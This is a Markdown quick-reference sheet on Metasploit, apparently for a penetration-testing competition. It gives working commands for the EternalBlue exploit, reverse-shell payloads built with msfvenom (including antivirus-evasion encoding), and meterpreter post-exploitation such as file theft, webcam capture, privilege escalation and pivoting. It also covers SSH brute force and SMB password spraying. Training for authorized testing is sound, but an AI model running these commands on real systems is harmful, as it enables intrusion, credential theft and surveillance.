# Metasploit Quick Reference for CPTC
---

## Quick Start

### Launch Metasploit
```bash

msfdb init

# Start console
msfconsole -q

# Or with resource script
msfconsole -q -r script.rc
```

### Search for Exploits
```bash
# In msfconsole:
search SERVICE_NAME
search type:exploit platform:windows smb
search cve:2017-0144  # Specific CVE

# From command line
msfconsole -q -x "search eternalblue; exit"
```

---

## Common CPTC Scenarios

### Scenario 1: EternalBlue (MS17-010)

**If you find Windows 7/Server 2008 with port 445:**

```bash
msfconsole -q

# Search
use exploit/windows/smb/ms17_010_eternalblue

# Configure
set RHOSTS 10.10.10.50
set LHOST YOUR_KALI_IP
set payload windows/x64/meterpreter/reverse_tcp

# Check if vulnerable (IMPORTANT - don't exploit blindly!)
check

# Exploit
exploit

# If successful, you get meterpreter session
```

**WARNING:** EternalBlue can crash systems! From CPTC webinar: "Don't use EternalBlue on DC - caused outage."
- Only use on non-critical systems
- Check with client first if unsure
- Document if you crash something

### Scenario 2: Multi-Handler (Catching Shells)

**When you have payload but want Metasploit shell management:**

```bash
msfconsole -q

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_KALI_IP
set LPORT 4444
exploit -j  # Background job

# Now generate payload with msfvenom
# When it executes, you get meterpreter session
```

**Useful for:**
- Multiple shells from different exploits
- Session management
- Post-exploitation modules

### Scenario 3: Web Application Exploits

**If searchsploit shows Metasploit module:**

```bash
# Search for exploit
search wordpress plugin name

# Use exploit
use exploit/unix/webapp/wordpress_plugin_vuln
set RHOSTS 10.10.10.50
set TARGETURI /
set payload php/meterpreter/reverse_tcp
set LHOST YOUR_IP
exploit
```

---

## Meterpreter Post-Exploitation

### Once You Have Meterpreter Session

```bash
# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i 1

# In meterpreter session:
sysinfo          # System information
getuid           # Current user
getprivs         # Privileges
ps               # Running processes

# File operations
download C:\\sensitive\\file.txt ./loot/
upload exploit.exe C:\\Temp\\exploit.exe

# Shell access
shell            # Drop to system shell
# Ctrl+Z to return to meterpreter

# Screenshots (if GUI)
screenshot

# Webcam (if present)
webcam_list
webcam_snap
```

### Meterpreter Privilege Escalation

```bash
# In meterpreter:
getsystem        # Try automatic privesc

# If fails, background and use modules:
background
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
exploit

# Or manual:
shell
whoami /priv
# Then use PrintSpoofer/GodPotato manually
```

### Meterpreter Pivoting

```bash
# Add route to internal network
route add 192.168.2.0 255.255.255.0 SESSION_ID

# Port forward
portfwd add -l 3389 -p 3389 -r 192.168.2.10

# Now access via localhost
xfreerdp /v:localhost:3389
```

---

## Payload Generation with msfvenom

### Windows Payloads

**Reverse shell exe:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o shell.exe
```

**Meterpreter exe:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o met.exe
```

**MSI (for AlwaysInstallElevated):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o exploit.msi
```

**DLL (for DLL hijacking):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f dll -o malicious.dll
```

### Linux Payloads

**ELF binary:**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

### Web Payloads

**PHP:**
```bash
msfvenom -p php/reverse_php LHOST=KALI_IP LPORT=4444 -f raw -o shell.php
```

**JSP:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f raw -o shell.jsp
```

**WAR (for Tomcat):**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f war -o shell.war
```

### Encoding/Evasion

```bash
# Encode payload (AV evasion)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -e x64/xor -i 3 -o encoded.exe

# Multiple iterations
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -e x64/xor -i 10 -o encoded.exe
```

---

## Useful Metasploit Modules

### Scanning and Enumeration

```bash
# SMB version scanning
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run

# SMB share enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.50
set SMBUser username
set SMBPass password
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.10.10.50
run
```

### Password Attacks

```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.50
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 4
run

# SMB password spray
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.10.0/24
set SMBUser administrator
set SMBPass Welcome2024!
run
```

---

## Quick Reference Commands

### Inside msfconsole

```bash
# Help
help
help search
help set

# Search
search type:exploit smb
search cve:2021

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS 10.10.10.50
set LHOST 10.10.10.100
set LPORT 4444
setg LHOST 10.10.10.100  # Global (all modules)

# Run
check     # Check if vulnerable
exploit   # Run exploit
run       # Same as exploit
exploit -j  # Background job

# Sessions
sessions -l
sessions -i 1
sessions -k 1  # Kill session

# Background
background
Ctrl+Z
```

### Database and Workspace

```bash
# Workspace for organization
workspace -a cptc_competition
workspace -l
workspace cptc_competition

# Import nmap
db_import nmap_scan.xml

# Search hosts
hosts
services
vulns
```

---

## Metasploit Checklist

**Before competition:**
- [ ] Start postgresql: `sudo systemctl start postgresql`
- [ ] Initialize msfdb: `msfdb init`
- [ ] Test msfconsole launches
- [ ] Know common modules (eternalblue, handler)

**During competition:**
- [ ] Use for payload generation (msfvenom)
- [ ] Use multi-handler if managing multiple shells
- [ ] Use specific modules for known vulnerabilities
- [ ] Document what module you used in findings
---
